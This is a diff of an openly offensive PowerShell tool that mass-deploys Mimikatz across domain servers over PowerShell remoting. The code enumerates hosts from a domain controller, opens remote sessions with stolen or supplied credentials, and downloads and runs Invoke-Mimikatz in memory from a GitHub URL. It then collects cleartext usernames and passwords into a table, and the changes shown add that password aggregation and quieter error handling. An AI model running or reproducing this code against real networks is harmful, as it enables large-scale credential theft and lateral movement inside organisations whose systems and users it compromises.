@@ -1,10 +1,14 @@
 # Author: Scott Sutherland (@_nullbind), 2015 NetSPI
 # Description:  This can be used to massmimikatz servers with registered winrm SPNs from a non domain system.
+# Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -DomainController dc.acme.com -Credential acme\user
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -verbose
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -OsFilter "2012" - verbose
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -PsUrl "https://10.1.1.1/Invoke-Mimikatz.ps1" -verbose
+# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 | out-file .\mimikatz-output.txt
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -DomainController 10.1.1.1 -Credential  -verbose
 # Note: this is based on work done by rob fuller, JosephBialek, carlos perez, benjamin delpy, and will schroeder.
+# note: returns data table object.
+# todo: fix psurl, add host opt from pipeline, add from host from file.
 # Just for fun.
 
 function Invoke-MassMimikatz-PsRemoting
@@ -71,11 +75,11 @@ function Invoke-MassMimikatz-PsRemoting
         # Get the list of domain computers
         # ----------------------------------------
 
-        Write-verbose "Getting list of Servers with WinRM installed from DC..."
+        Write-verbose "Getting list of Servers from $DomainController..."
 
         # Create data table to house results
-        $TblServers2012 = New-Object System.Data.DataTable 
-        $TblServers2012.Columns.Add("ComputerName") | Out-Null
+        $TblServers = New-Object System.Data.DataTable 
+        $TblServers.Columns.Add("ComputerName") | Out-Null
 
         # Get domain computers from dc 
         if ($OsFilter -eq "*"){
@@ -105,9 +109,16 @@ function Invoke-MassMimikatz-PsRemoting
             
             #add server to data table
             $ComputerName = [string]$_.properties.dnshostname
-            $TblServers2012.Rows.Add($ComputerName) | Out-Null 
+            $TblServers.Rows.Add($ComputerName) | Out-Null 
         }
 
+        # Create data table to house results to return
+        $TblPasswordList = New-Object System.Data.DataTable 
+        $TblPasswordList.Columns.Add("Type") | Out-Null
+        $TblPasswordList.Columns.Add("Domain") | Out-Null
+        $TblPasswordList.Columns.Add("Username") | Out-Null
+        $TblPasswordList.Columns.Add("Password") | Out-Null  
+        $TblPasswordList.Clear()
 
         # ----------------------------------------
         # Mimikatz prase function (Will Schoeder's) 
@@ -123,7 +134,7 @@ function Invoke-MassMimikatz-PsRemoting
     
             # Create data table to house results
             $TblPasswords = New-Object System.Data.DataTable 
-            $TblPasswords.Columns.Add("Type") | Out-Null
+            $TblPasswords.Columns.Add("PwType") | Out-Null
             $TblPasswords.Columns.Add("Domain") | Out-Null
             $TblPasswords.Columns.Add("Username") | Out-Null
             $TblPasswords.Columns.Add("Password") | Out-Null    
@@ -147,8 +158,8 @@ function Invoke-MassMimikatz-PsRemoting
                         }
                         if ($password -and $($password -ne "(null)")){
                             #$username+"/"+$domain+":"+$password
-                            $type = "msv"
-                            $TblPasswords.Rows.Add($type,$domain,$username,$password) | Out-Null 
+                            $Pwtype = "msv"
+                            $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
                         }
                     }
                 }
@@ -171,9 +182,8 @@ function Invoke-MassMimikatz-PsRemoting
                         }
                         if ($password -and $($password -ne "(null)")){
                             #$username+"/"+$domain+":"+$password
-                            $type = "wdigest/tspkg"
-                            $TblPasswords
-                            .Rows.Add($type,$domain,$username,$password) | Out-Null
+                            $Pwtype = "wdigest/tspkg"
+                            $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                         }
                     }
                 }
@@ -196,8 +206,8 @@ function Invoke-MassMimikatz-PsRemoting
                         }
                         if ($password -and $($password -ne "(null)")){
                             #$username+"/"+$domain+":"+$password
-                            $type = "wdigest/kerberos"
-                            $TblPasswords.Rows.Add($type,$domain,$username,$password) | Out-Null
+                            $Pwtype = "wdigest/kerberos"
+                            $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                         }
                     }
                 }
@@ -220,14 +230,16 @@ function Invoke-MassMimikatz-PsRemoting
                         }
                         if ($password -and $($password -ne "(null)")){
                             #$username+"/"+$domain+":"+$password
-                            $type = "kerberos/ssp"
-                            $TblPasswords.Rows.Add($type,$domain,$username,$password) | Out-Null
+                            $Pwtype = "kerberos/ssp"
+                            $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
                         }
                     }
                 }
             }
 
+            # Remove the computer accounts
             $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}
+
             return $TblPasswords_Clean
         }
 
@@ -235,15 +247,15 @@ function Invoke-MassMimikatz-PsRemoting
         # ----------------------------------------
         # Establish sessions
         # ---------------------------------------- 
-        $ServerCount = $TblServers2012.Rows.Count
-        Write-Verbose "Found $ServerCount servers with winrm enabled."
+        $ServerCount = $TblServers.Rows.Count
+        Write-Verbose "Found $ServerCount servers that met search criteria."
         Write-verbose "Attempting to create $MaxHosts ps sessions..."
 
         # Set counters
         $Counter = 0     
         $SessionCount = 0   
 
-        $TblServers2012 | 
+        $TblServers | 
         ForEach-Object {
 
             if ($Counter -le $ServerCount -and $SessionCount -lt $MaxHosts){
@@ -254,30 +266,42 @@ function Invoke-MassMimikatz-PsRemoting
 
                 # attempt session
                 [string]$MyComputer = $_.ComputerName    
-                Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $Counter of $ServerCount"         
-                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue            
+                Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $Counter of $ServerCount - $MyComputer"         
+                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue | Out-Null          
             }
         }                   
 
 
-        # ----------------------------------------
-        # Attempt to run mimikatz
-        # ---------------------------------------- 
+        # ---------------------------------------------
+        # Attempt to run mimikatz against open sessions
+        # ---------------------------------------------
         if($SessionCount -ge 1){
 
             # run the mimikatz command
             Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
             $x = Get-PSSession
-            $MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("$PsUrl");invoke-mimikatz}
-            Parse-Mimikatz -raw $MimikatzOutput
+            [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1");invoke-mimikatz -ErrorAction SilentlyContinue} -ErrorAction SilentlyContinue           
+            $TblResults = Parse-Mimikatz -raw $MimikatzOutput
+            $TblResults | foreach {
+            
+                [string]$pwtype = $_.pwtype
+                [string]$pwdomain = $_.domain
+                [string]$pwusername = $_.username
+                [string]$pwpassword = $_.password
+                $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword) | Out-Null
+            }
+            
 
             # remove sessions
             Write-verbose "Removing ps sessions..."
-            Disconnect-PSSession -Session $x
-            Remove-PSSession -Session $x
+            Disconnect-PSSession -Session $x | Out-Null
+            Remove-PSSession -Session $x | Out-Null
 
             # Clear datatable
-            $TblServers2012.Clear()
+            $TblServers.Clear()
+            
+            # Return passwords
+            $TblPasswordList | select type,domain,username,password -Unique | Sort-Object domain,username,password
         
         }else{
             Write-verbose "No ps sessions could be created."
